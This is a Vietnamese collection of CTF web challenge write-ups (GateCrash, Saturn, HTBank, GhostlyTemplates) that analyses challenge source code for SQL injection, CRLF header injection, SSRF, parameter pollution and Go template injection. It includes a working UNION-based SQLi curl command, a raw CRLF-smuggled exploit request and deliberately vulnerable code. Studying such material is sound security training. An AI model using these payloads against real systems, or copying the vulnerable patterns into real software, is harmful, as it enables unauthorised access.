<p>Link: <a href="https://hackmd.io/3qU5TxPlQDKNAac9VyGrLA?view#WebBlueprint-Heist">https://hackmd.io/3qU5TxPlQDKNAac9VyGrLA?view#WebBlueprint-Heist</a></p>
<h2 id="labyrinth-linguist">Labyrinth Linguist</h2>
<p>Link: <a href="https://hackmd.io/17yFgOmaQs252Gg5dQwQKg#Labyrinth_linguist4">https://hackmd.io/17yFgOmaQs252Gg5dQwQKg#Labyrinth_linguist4</a></p>
<h2 id="gatecrash">GateCrash</h2>
<ul>
<li>M·ªôt chall ch·∫°y go server v·ªõi proxy server ch·∫°y b·∫±ng nim server + sqlite3 database:</li>
</ul>
<h3 id="go-server">Go server</h3>
<pre><code>func main() {
	var err error
	db, err = sql.Open(&quot;sqlite3&quot;, sqlitePath)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	seedDatabase()

	r := mux.NewRouter()
	r.HandleFunc(&quot;/login&quot;, loginHandler).Methods(&quot;POST&quot;)

	http.Handle(&quot;/&quot;, r)
	fmt.Println(&quot;Server is running on &quot; + strconv.Itoa(webPort))
	http.ListenAndServe(&quot;:&quot;+strconv.Itoa(webPort), nil)
}

</code></pre><ul>
<li>·ªü ƒë√¢y ta ch·ªâ th·∫•y khi kh·ªüi t·∫°o server s·∫Ω kh·ªüi t·∫°o sqlite3 sau ƒë√≥ g·ªçi <code>seedDatabase</code> sau ƒë√≥ ch√∫ng ta connect ƒë∆∞·ª£c /login v·ªõi method <code>POST</code> v√† <code>loginHandler</code> ƒë·ªÉ x·ª≠ l√≠ logic ·ªü ƒë√¢y.</li>
</ul>
<pre><code>func seedDatabase() {
	createTable := `
	CREATE TABLE IF NOT EXISTS users (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		username TEXT NOT NULL,
		password TEXT NOT NULL
	);
	`

	_, err := db.Exec(createTable)
	if err != nil {
		log.Fatal(err)
	}

	for i := 0; i &lt; 10; i++ {
		newUser, _ := randomHex(32)
		newPass, _ := randomHex(32)

		hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPass), bcrypt.DefaultCost)
		if err != nil {
			fmt.Println(err)
			return
		}

		_, err = db.Exec(&quot;INSERT INTO users (username, password) VALUES ('&quot; + newUser + &quot;', '&quot; + string(hashedPassword) + &quot;');&quot;)
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}
</code></pre><ul>
<li>
<p>·ªü ƒë√¢y n√≥ s·∫Ω t·∫°o m·ªôt b·∫£ng users v·ªõi c√°c c·ªôt l√† id, username, password -&gt; insert 10 user ƒë·∫ßu ti√™n v√†o trong b·∫£ng users v∆°i t√™n username, password ƒë∆∞·ª£c <code>randomHex</code> v√† password s·∫Ω ƒë∆∞·ª£c <code>bcrypt</code>.</p>
</li>
<li>
<p>api /login sex tr·∫£ v·ªÅ m·ªôt :</p>
</li>
</ul>
<pre><code>func loginHandler(w http.ResponseWriter, r *http.Request) {
	found := false
	for _, userAgent := range allowedUserAgents {
		if strings.Contains(r.Header.Get(&quot;User-Agent&quot;), userAgent) {
			found = true
			break
		}
	}

	if !found {
		http.Error(w, &quot;Browser not supported&quot;, http.StatusNotAcceptable)
		return
	}

	var user User
	err := json.NewDecoder(r.Body).Decode(&amp;user)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	userPassword := user.Password

	row := db.QueryRow(&quot;SELECT * FROM users WHERE username='&quot; + user.Username + &quot;';&quot;)
	err = row.Scan(&amp;user.ID, &amp;user.Username, &amp;user.Password)
	if err != nil {
		http.Error(w, &quot;Invalid username or password&quot;, http.StatusUnauthorized)
		return
	}

	err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(userPassword))
	if err != nil {
		http.Error(w, &quot;Invalid username or password&quot;, http.StatusUnauthorized)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, &quot;Login successful&quot;)
}

</code></pre><ul>
<li>ƒë·∫ßu ti√™n s·∫Ω check xem c·ªßa header User-Agent hay kh√¥ng n·∫øu m√† c√≥ th√¨ cho qua -&lt; sau ƒë√≥ s·∫Ω th·ª±c hi·ªán m·ªôt l·ªánh truy v·∫•n v√†o trong database:</li>
</ul>
<p><code>row := db.QueryRow(&quot;SELECT * FROM users WHERE username='&quot; + user.Username + &quot;';&quot;)</code> -&gt; theo nh∆∞ quan s√°t th√¨ ta th·∫•y c√¢u truy v·∫•n b·ªã sqli do vi·ªác c·ªông chu·ªói v√† c√¢u l·ªánh n√†y s·∫Ω ki·ªÉm tra l√† username n√†y ƒë√£ t·ªìn t·∫°i ·ªü trong db hay ch∆∞a-&gt; n·∫øu ch∆∞a th√¨ th·ª±c hi·ªán brcypt m·∫≠t kh·∫©u v√† l∆∞u v√†o trong db -&gt; tr·∫£ v·ªÅ status 200</p>
<ul>
<li>M·ª•c ti√™u ·ªü ƒë√¢y l√† ch√∫ng l·∫•y ƒë∆∞·ª£c flag nh∆∞ng flag n·∫±m trong nim proxy n√™n b√¢y gi·ªù ch√∫ng ta h√£y ph√¢n t√≠ch</li>
</ul>
<h3 id="nim-proxy">Nim proxy</h3>
<pre><code>import asyncdispatch, strutils, jester, httpClient, json
import std/uri

const userApi = &quot;http://127.0.0.1:9090&quot;

proc msgjson(msg: string): string =
  &quot;&quot;&quot;{&quot;msg&quot;: &quot;$#&quot;}&quot;&quot;&quot; % [msg]

proc containsSqlInjection(input: string): bool =
  for c in input:
    let ordC = ord(c)
    if not ((ordC &gt;= ord('a') and ordC &lt;= ord('z')) or
            (ordC &gt;= ord('A') and ordC &lt;= ord('Z')) or
            (ordC &gt;= ord('0') and ordC &lt;= ord('9'))):
      return true
  return false

settings:
  port = Port 1337

routes:
  post &quot;/user&quot;:
    let username = @&quot;username&quot;
    let password = @&quot;password&quot;

    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson(&quot;Malicious input detected&quot;)

    let userAgent = decodeUrl(request.headers[&quot;user-agent&quot;])

    let jsonData = %*{
      &quot;username&quot;: username,
      &quot;password&quot;: password
    }

    let jsonStr = $jsonData

    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({&quot;Content-Type&quot;: &quot;application/json&quot;})

    let response = client.request(userApi &amp; &quot;/login&quot;, httpMethod = HttpPost, body = jsonStr)

    if response.code != Http200:
      resp msgjson(response.body.strip())
       
    resp msgjson(readFile(&quot;/flag.txt&quot;))

runForever()

</code></pre><ul>
<li>C√≥ th·ªÉ th·∫•y n√≥ ch·∫°y ·ªü port 1337 v√† s·∫Ω chuy·ªÉn ti·∫øp c√°c y√™u c·∫ßu ƒë·∫øn port 9090 -&gt; ƒë·ªÉ √Ω ·ªü ƒë√¢y ch·ªâ c√≥ m·ªôt route /user:</li>
</ul>
<pre><code>routes:
  post &quot;/user&quot;:
    let username = @&quot;username&quot;
    let password = @&quot;password&quot;

    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson(&quot;Malicious input detected&quot;)

    let userAgent = decodeUrl(request.headers[&quot;user-agent&quot;])

    let jsonData = %*{
      &quot;username&quot;: username,
      &quot;password&quot;: password
    }

    let jsonStr = $jsonData

    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({&quot;Content-Type&quot;: &quot;application/json&quot;})

    let response = client.request(userApi &amp; &quot;/login&quot;, httpMethod = HttpPost, body = jsonStr)

    if response.code != Http200:
      resp msgjson(response.body.strip())
       
    resp msgjson(readFile(&quot;/flag.txt&quot;))
</code></pre><ul>
<li>nh·∫≠n username v√† password c·ªßa ng∆∞·ªùi d√πng -&gt; sau ƒë√≥ check qua h√†m <code>containsSqlInjection</code> c·∫£ 2 tham s·ªë n√†y:</li>
</ul>
<p><code>proc containsSqlInjection(input: string): bool = for c in input: let ordC = ord(c) if not ((ordC &gt;= ord('a') and ordC &lt;= ord('z')) or (ordC &gt;= ord('A') and ordC &lt;= ord('Z')) or (ordC &gt;= ord('0') and ordC &lt;= ord('9'))): return true return false</code></p>
<ul>
<li>Nh∆∞ ƒë√£ th·∫•y th√¨ ch·ªâ cho ph√©p c√°c k√≠ t·ª± n·∫±m t·ª´ a-zA-Z0-9 -&gt; n·∫øu ki·ªÉm tra th√†nh c√¥ng s·∫Ω l·∫•y user-agent t·ª´ header + jsonData l√† username v√† password ƒë√£ n√≥i ·ªü tr√™n -&gt; th·ª±c hi·ªán g·ª≠i ƒë·∫øn go server ƒë·ªÉ login n·∫øu m√† tr·∫£ ra 200 -&gt; nh·∫≠n flag.</li>
</ul>
<h3 id="flow-1">Flow</h3>
<ul>
<li>Ta s·∫Ω d√πng crlf ƒë·ªÉ bypass vi·ªác g·ª≠i username v√† pasword c·ªßa ng∆∞·ªùi d√πng ƒë·ªÉ v∆∞·ª£t qua waf</li>
</ul>
<p><img src="https://hackmd.io/_uploads/HyWdhkd8R.png" alt="image"></p>
<ul>
<li>N·∫øu build docker th√¨ c√≥ th·ªÉ d√πng l·ªánh : <code>curl &quot;http://localhost:9090/login&quot; -X POST   --data-binary $'{\&quot;username\&quot;:\&quot;asas\' union select 1 as id , \'hacker\' as username , \'$2a$10$N2/NBEeXbAL5XqK6l.ZLAuJkZgRcWE9SLcXJlQ.paq/5c0bTqoFne\' as password  -- \&quot;, \&quot;password\&quot;:\&quot;password123\&quot;}' -H &quot;User-Agent: Mozilla/7.0&quot; -H &quot;Content-Type: application/json&quot;</code> ƒë·ªÉ ki·ªÉm tra xem sqli c·ªßa b·∫°n c√≥ ho·∫°t ƒë·ªông hay kh√¥ng</li>
</ul>
<h3 id="khai-th√°c">Khai th√°c</h3>
<p><img src="https://hackmd.io/_uploads/HklvTkO8A.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SyY9Ak_U0.png" alt="image"></p>
<pre><code>POST /user HTTP/1.1
Host: 94.237.54.176:38751
User-Agent: Mozilla/7.0%0d%0a%0d%0a%7b%22username%22%3a%22asas'%20union%20select%201%20as%20id%2c%20'hacker'%20as%20username%2c%20'%242a%2410%24N2%2fNBEeXbAL5XqK6l.ZLAuJkZgRcWE9SLcXJlQ.paq%2f5c0bTqoFne'%20as%20password%20%20--%20%22%2c%22password%22%3a%22password123%22%7d
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.54.176:38751/
Content-Type: application/x-www-form-urlencoded
Content-Length: 173
Origin: http://94.237.54.176:38751
Connection: close
Priority: u=1

username=hehaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae&amp;password=huhuaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</code></pre><p>flag : <code>HTB{do_the_d45h_0n_d4_p4r53r!}</code></p>
<h2 id="saturn">Saturn</h2>
<ul>
<li>M·ªôt chall v·ªõi python flask:</li>
</ul>
<pre><code>from flask import Flask, request, render_template
import requests
from safeurl import safeurl

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url)
        except:
            return render_template('index.html', error=f&quot;Malicious input detected.&quot;)
        r = requests.get(url)
        return render_template('index.html', result=r.text)
    return render_template('index.html')


@app.route('/secret')
def secret():
    if request.remote_addr == '127.0.0.1':
        flag = &quot;&quot;
        with open('./flag.txt') as f:
            flag = f.readline()
        return render_template('secret.html', SECRET=flag)
    else:
        return render_template('forbidden.html'), 403


if __name__ == '__main__':
    app.run(host=&quot;0.0.0.0&quot;, port=1337, threaded=True)

</code></pre><ul>
<li>C√≥ th·ªÉ th·∫•y l√† server c√≥ 2 route ch√≠nh :</li>
</ul>
<pre><code>@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url)
        except:
            return render_template('index.html', error=f&quot;Malicious input detected.&quot;)
        r = requests.get(url)
        return render_template('index.html', result=r.text)
    return render_template('index.html')

</code></pre><ul>
<li>Route / s·∫Ω nh·∫≠n 2 method ·ªü ƒë√¢y ta s·∫Ω quan t√¢m ƒë·∫øn POST server nh·∫≠n url do ta cung c·∫•p sau ƒë√≥ check url qua module: <code>safeurl</code></li>
<li>N·∫øu th√†nh c√¥ng th√¨ s·∫Ω th·ª±c hi·ªán g·ª≠i request ƒë·∫øn url c·ªßa m√¨nh g·ª≠i, c√≤n n·∫øu m√† kh√¥ng th√†nh c√¥ng th√¨ s·∫Ω hi·ªÉn th·ªã l·ªói, v√† khi th√†nh c√¥ng s·∫Ω tr·∫£ ra k·∫øt qu·∫£.</li>
<li>Route /secret:</li>
</ul>
<pre><code>@app.route('/secret')
def secret():
    if request.remote_addr == '127.0.0.1':
        flag = &quot;&quot;
        with open('./flag.txt') as f:
            flag = f.readline()
        return render_template('secret.html', SECRET=flag)
    else:
        return render_template('forbidden.html'), 403
</code></pre><ul>
<li>Ch·ªâ ch·∫•p nh·∫≠n localhost v√† tr·∫£ ra flag cho m√¨nh -&gt; b√†i n√†y ƒë∆°n gi·∫£n l√† SSRF ƒë·ªÉ l·∫•y flag qua localhost.</li>
<li>V·∫•n ƒë·ªÅ ·ªü ƒë√¢y l√† bypass ƒë∆∞·ª£c <code>safeurl</code> ƒë·ªÉ g·ª≠i ƒë·∫øn localhost.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/HJw-7NgLA.png" alt="image"></p>
<ul>
<li>TOC/TOU: <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use</a></li>
</ul>
<h2 id="htbank">HTBank</h2>
<ul>
<li>M·ªôt chall ƒë∆∞·ª£c vi·∫øt b·∫±ng flask_frontend + php_backend + Mysql</li>
</ul>
<h3 id="php_backend">php_backend</h3>
<pre><code>&lt;?php spl_autoload_register(function ($name) {
    if (preg_match('/Controller$/', $name)) {
        $name = &quot;controllers/${name}&quot;;
    } elseif (preg_match('/Model$/', $name)) {
        $name = &quot;models/${name}&quot;;
    }
    include_once &quot;${name}.php&quot;;
});

$database = new Database('localhost', 'xclow3n', 'xCl0w3n1337!!', 'web_htbank');
$database-&gt;connect();

$router = new Router();
$router-&gt;new('POST', '/api/withdraw', 'WithdrawController@index');

die($router-&gt;match());

</code></pre><ul>
<li>·ªü ƒë√¢y c√≥ m·ªôt api duy nh·∫•t ƒë√≥ l√† <code>/api/withdraw</code> v√† logic c·ªßa n√≥ ho·∫°t ƒë·ªông nh∆∞ sau:</li>
</ul>
<pre><code>&lt;?php

class WithdrawController extends Controller
{
    public function __construct()
    {
        parent::__construct();
    }

    public function index($router)
    {
        $amount = $_POST['amount'];
        $account = $_POST['account'];

        if ($amount == 1337) {
            $this-&gt;database-&gt;query('UPDATE flag set show_flag=1');

            return $router-&gt;jsonify([
                'message' =&gt; 'OK'
            ]);
        }

        return $router-&gt;jsonify([
            'message' =&gt; 'We don\'t accept that amount'
        ]);
    }

}
</code></pre><ul>
<li>·ªü ƒë√¢y s·∫Ω nh·∫≠n 2 tham s·ªë POST ƒë√≥ l√† amount v√† account -&gt; n·∫øu amount == 1337 th√¨ update b·∫£ng flag set show_flag=1 -&gt; tr·∫£ ra ok n·∫øu th√†nh c√¥ng.</li>
</ul>
<h3 id="flask_frontend">flask_frontend</h3>
<ul>
<li>·ªü ƒë√¢y ta c√≥ th·ªÉ th·∫•y c√≥ 2 route ch√≠nh :</li>
</ul>
<pre><code>
from flask import Flask
from application.blueprints.routes import web, api
from application.database import mysql
from application.util import response

app = Flask(__name__)
app.config.from_object('application.config.Config')

mysql.init_app(app)

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

@app.errorhandler(404)
def not_found(error):
    return response('404 Not Found'), 404

@app.errorhandler(403)
def forbidden(error):
    return response('403 Forbidden'), 403

@app.errorhandler(400)
def bad_request(error):
    return response('400 Bad Request'), 400

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
    response = {
        'error': {
            'type': error.__class__.__name__,
            'message': message
        }
    }

    return response, error.code if hasattr(error, 'code') else 500
</code></pre><ul>
<li>N√≥ ƒë∆∞·ª£c import t·ª´ :</li>
</ul>
<pre><code>
from application.database import *
from flask import Blueprint, session, jsonify, redirect, render_template, request, make_response, current_app
from application.util import response, isAuthenticated
import datetime, sys, requests

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def login():
    return render_template('login.html')

@web.route('/home')
@isAuthenticated
def home(decoded_token):
    user = getUser(decoded_token.get('username'))
    flag = getFlag()
    
    if(flag[0].get('show_flag') == 1):
        return render_template('home.html', user=user[0], flag=flag[0].get('flag'))


    return render_template('home.html', user=user[0])

@web.route('/logout')
def logout():
    res = make_response(redirect('/'))
    res.set_cookie('session', '', expires=0)
    return res

@api.route('/login', methods=['POST'])
def api_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
        
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login_user_db(username, password)
    
    if user:
        res = response('Logged in successfully!')
        res.status_code = 200
        res.set_cookie('session', user, expires=datetime.datetime.utcnow() + datetime.timedelta(minutes=360), httponly=False)
        return res

    return response('Invalid credentials!'), 403

@api.route('/register', methods=['POST'])
def api_register():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = register_user_db(username, password)
    
    if user:
        return response('User registered! Please login'), 200
        
    return response('User already exists!'), 403

@api.route('/withdraw', methods=['POST'])
@isAuthenticated
def withdraw(decoded_token):
    body = request.get_data()
    amount = request.form.get('amount', '')
    account = request.form.get('account', '')
    
    if not amount or not account:
        return response('All fields are required!'), 401
    
    user = getUser(decoded_token.get('username'))

    try:
        if (int(user[0].get('balance')) &lt; int(amount) or int(amount) &lt; 0 ):
            return response('Not enough credits!'), 400

        res = requests.post(f&quot;http://{current_app.config.get('PHP_HOST')}/api/withdraw&quot;, 
            headers={&quot;content-type&quot;: request.headers.get(&quot;content-type&quot;)}, data=body)
        
        jsonRes = res.json()

        return response(jsonRes['message'])
    except:
        return response('Only accept number!'), 500
</code></pre><ul>
<li>C√≥ th·ªÉ th·∫•y ·ªü ƒë√¢y c√≥ c√°c route /home s·∫Ω nh·∫≠n ƒë∆∞·ª£c flag khi show_flag=1 t·ª©c ra ta ph·∫£i g·ªçi ƒë·∫øn api/withdraw kia c·ªßa backend_php.</li>
<li>Route /withdraw v·ªõi method post nh·∫≠n account v√† amount t·ª´ client -&gt; ::</li>
</ul>
<pre><code>if (int(user[0].get('balance')) &lt; int(amount) or int(amount) &lt; 0 ):
            return response('Not enough credits!'), 400
</code></pre><ul>
<li>L∆∞u √Ω l√† khi g·ª≠i data ƒë·∫øn be n√≥ l·∫°i d√πng <code>  body = request.get_data()</code> n√™n ta c√≥ th·ªÉ l·ª£i d·ª•ng ƒë·ªÉ truy·ªÅn 2 l·∫ßn amount == 1337 v√† nh·∫≠n flag:</li>
</ul>
<p><img src="https://hackmd.io/_uploads/rJAFmb_80.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJjnQb_8R.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Byh4EZO8C.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B13I4Z_U0.png" alt="image"></p>
<p>Flag: <code>HTB{p4r4m3t3r_p0llut10n_4r3_1mp0rt4nt_p4tch_1t_B0NK!}</code></p>
<h2 id="ghostlytemplates">GhostlyTemplates</h2>
<ul>
<li>m·ªôt chall v·ªõi golang + template -&gt; v·ªõi t√™n chall th√¨ ta c√≥ th·ªÉ nghƒ© ƒë·∫øn n√≥ l√† m·ªôt vul v·ªõi template m√† ch·ªâ c√≥ ssti ƒë∆∞·ª£c th√¥i -&gt; c√πng v√†o ph√¢n t√≠ch source code:</li>
</ul>
<pre><code>
package main

import (
	&quot;encoding/json&quot;
	&quot;fmt&quot;
	&quot;html/template&quot;
	&quot;io&quot;
	&quot;net/http&quot;
	&quot;os&quot;
	&quot;os/exec&quot;
	&quot;path/filepath&quot;
	&quot;strings&quot;
)

const WEB_PORT = &quot;1337&quot;
const TEMPLATE_DIR = &quot;./templates&quot;

type LocationInfo struct {
	Status      string  `json:&quot;status&quot;`
	Country     string  `json:&quot;country&quot;`
	CountryCode string  `json:&quot;countryCode&quot;`
	Region      string  `json:&quot;region&quot;`
	RegionName  string  `json:&quot;regionName&quot;`
	City        string  `json:&quot;city&quot;`
	Zip         string  `json:&quot;zip&quot;`
	Lat         float64 `json:&quot;lat&quot;`
	Lon         float64 `json:&quot;lon&quot;`
	Timezone    string  `json:&quot;timezone&quot;`
	ISP         string  `json:&quot;isp&quot;`
	Org         string  `json:&quot;org&quot;`
	AS          string  `json:&quot;as&quot;`
	Query       string  `json:&quot;query&quot;`
}

type MachineInfo struct {
	Hostname      string
	OS            string
	KernelVersion string
	Memory        string
}

type RequestData struct {
	ClientIP     string
	ClientUA     string
	ServerInfo   MachineInfo
	ClientIpInfo LocationInfo `json:&quot;location&quot;`
}

func GetServerInfo(command string) string {
	out, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()
	if err != nil {
		return &quot;&quot;
	}
	return string(out)
}

func (p RequestData) GetLocationInfo(endpointURL string) (*LocationInfo, error) {
	resp, err := http.Get(endpointURL)
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var locationInfo LocationInfo
	if err := json.Unmarshal(body, &amp;locationInfo); err != nil {
		return nil, err
	}

	return &amp;locationInfo, nil
}

func (p RequestData) IsSubdirectory(basePath, path string) bool {
	rel, err := filepath.Rel(basePath, path)
	if err != nil {
		return false
	}
	return !strings.HasPrefix(rel, &quot;..&quot;+string(filepath.Separator))
}

func (p RequestData) OutFileContents(filePath string) string {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err.Error()
	}
	return string(data)
}

func readRemoteFile(url string) (string, error) {
	response, err := http.Get(url)
	if err != nil {
		return &quot;&quot;, err
	}

	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return &quot;&quot;, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, response.StatusCode)
	}

	content, err := io.ReadAll(response.Body)
	if err != nil {
		return &quot;&quot;, err
	}

	return string(content), nil
}

func getIndex(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, &quot;/view?page=index.tpl&quot;, http.StatusMovedPermanently)
}

func getTpl(w http.ResponseWriter, r *http.Request) {
	var page string = r.URL.Query().Get(&quot;page&quot;)
	var remote string = r.URL.Query().Get(&quot;remote&quot;)

	if page == &quot;&quot; {
		http.Error(w, &quot;Missing required parameters&quot;, http.StatusBadRequest)
		return
	}

	reqData := &amp;RequestData{}

	userIPCookie, err := r.Cookie(&quot;user_ip&quot;)
	clientIP := &quot;&quot;

	if err == nil {
		clientIP = userIPCookie.Value
	} else {
		clientIP = strings.Split(r.RemoteAddr, &quot;:&quot;)[0]
	}

	userAgent := r.Header.Get(&quot;User-Agent&quot;)

	locationInfo, err := reqData.GetLocationInfo(&quot;https://freeipapi.com/api/json/&quot; + clientIP)

	if err != nil {
		http.Error(w, &quot;Could not fetch IP location info&quot;, http.StatusInternalServerError)
		return
	}

	reqData.ClientIP = clientIP
	reqData.ClientUA = userAgent
	reqData.ClientIpInfo = *locationInfo
	reqData.ServerInfo.Hostname = GetServerInfo(&quot;hostname&quot;)
	reqData.ServerInfo.OS = GetServerInfo(&quot;cat /etc/os-release | grep PRETTY_NAME | cut -d '\&quot;' -f 2&quot;)
	reqData.ServerInfo.KernelVersion = GetServerInfo(&quot;uname -r&quot;)
	reqData.ServerInfo.Memory = GetServerInfo(&quot;free -h | awk '/^Mem/{print $2}'&quot;)

	var tmplFile string

	if remote == &quot;true&quot; {
		tmplFile, err = readRemoteFile(page)

		if err != nil {
			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
			return
		}
	} else {
		if !reqData.IsSubdirectory(&quot;./&quot;, TEMPLATE_DIR+&quot;/&quot;+page) {
			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
			return
		}

		tmplFile = reqData.OutFileContents(TEMPLATE_DIR + &quot;/&quot; + page)
	}

	tmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)
	if err != nil {
		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
		return
	}

	err = tmpl.Execute(w, reqData)
	if err != nil {
		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
		return
	}
}

func main() {
	mux := http.NewServeMux()

	mux.HandleFunc(&quot;/&quot;, getIndex)
	mux.HandleFunc(&quot;/view&quot;, getTpl)
	mux.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, http.FileServer(http.Dir(&quot;static&quot;))))

	fmt.Println(&quot;Server started at port &quot; + WEB_PORT)
	http.ListenAndServe(&quot;:&quot;+WEB_PORT, mux)
}

</code></pre><ul>
<li>C√≥ 2 route ch√≠nh:</li>
</ul>
<pre><code>mux.HandleFunc(&quot;/&quot;, getIndex)
mux.HandleFunc(&quot;/view&quot;, getTpl)
</code></pre><ul>
<li>/ ch·ªâ ƒë∆°n gi·∫£n l√† tr·∫£ ra <code>page=index.tpl</code></li>
<li>/view route:</li>
</ul>
<pre><code>
func getTpl(w http.ResponseWriter, r *http.Request) {
	var page string = r.URL.Query().Get(&quot;page&quot;)
	var remote string = r.URL.Query().Get(&quot;remote&quot;)

	if page == &quot;&quot; {
		http.Error(w, &quot;Missing required parameters&quot;, http.StatusBadRequest)
		return
	}

	reqData := &amp;RequestData{}

	userIPCookie, err := r.Cookie(&quot;user_ip&quot;)
	clientIP := &quot;&quot;

	if err == nil {
		clientIP = userIPCookie.Value
	} else {
		clientIP = strings.Split(r.RemoteAddr, &quot;:&quot;)[0]
	}

	userAgent := r.Header.Get(&quot;User-Agent&quot;)

	locationInfo, err := reqData.GetLocationInfo(&quot;https://freeipapi.com/api/json/&quot; + clientIP)

	if err != nil {
		http.Error(w, &quot;Could not fetch IP location info&quot;, http.StatusInternalServerError)
		return
	}

	reqData.ClientIP = clientIP
	reqData.ClientUA = userAgent
	reqData.ClientIpInfo = *locationInfo
	reqData.ServerInfo.Hostname = GetServerInfo(&quot;hostname&quot;)
	reqData.ServerInfo.OS = GetServerInfo(&quot;cat /etc/os-release | grep PRETTY_NAME | cut -d '\&quot;' -f 2&quot;)
	reqData.ServerInfo.KernelVersion = GetServerInfo(&quot;uname -r&quot;)
	reqData.ServerInfo.Memory = GetServerInfo(&quot;free -h | awk '/^Mem/{print $2}'&quot;)

	var tmplFile string

	if remote == &quot;true&quot; {
		tmplFile, err = readRemoteFile(page)

		if err != nil {
			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
			return
		}
	} else {
		if !reqData.IsSubdirectory(&quot;./&quot;, TEMPLATE_DIR+&quot;/&quot;+page) {
			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
			return
		}

		tmplFile = reqData.OutFileContents(TEMPLATE_DIR + &quot;/&quot; + page)
	}

	tmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)
	if err != nil {
		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
		return
	}

	err = tmpl.Execute(w, reqData)
	if err != nil {
		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
		return
	}
}
</code></pre><ul>
<li>Nh·∫≠n 2 parameter ƒë√≥ l√† page v√† remote -&gt; l·∫•y c·∫£ <code>user_ip</code> t·ª´ cookie ·ªßa ng∆∞·ªùi d√πng -&gt; nh·∫≠n <code>userAgent</code> -&gt; ki·ªÉm tra ip location n·∫øu kh√¥ng c√≥ tr·∫£ ra  error -&gt; khai b√°o bi·∫øn <code>tmplFile</code> -&gt;  remote == &ldquo;true&rdquo; -&gt; g·ªçi <code>tmplFile, err = readRemoteFile(page)</code>:</li>
</ul>
<pre><code>func readRemoteFile(url string) (string, error) {
	response, err := http.Get(url)
	if err != nil {
		return &quot;&quot;, err
	}

	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return &quot;&quot;, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, response.StatusCode)
	}

	content, err := io.ReadAll(response.Body)
	if err != nil {
		return &quot;&quot;, err
	}

	return string(content), nil
}
</code></pre><ul>
<li>
<p>H√†m n√†y s·∫Ω tr·∫£ ra m·ªôt string nh·∫≠n v·ªÅ sau khi get ƒë·∫øn url.</p>
</li>
<li>
<p>Quay tr·ªü l·∫°i v·ªõi lu·ªìng ch√≠nh c·ªßa ch∆∞∆°ng tr√¨nh -&gt; <code>tmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)</code> -&gt; th·ª±c hi·ªán render <code>err = tmpl.Execute(w, reqData)</code>.</p>
</li>
<li>
<p>Nguy·ªÉn nh√¢n d·∫´n ƒë·∫øn l·ªó h·ªïng : <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></p>
</li>
</ul>
<h3 id="exploit">Exploit</h3>
<p><img src="https://hackmd.io/_uploads/SkMQT-_80.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ryDyTbdUC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJpgaZdIA.png" alt="image"></p>
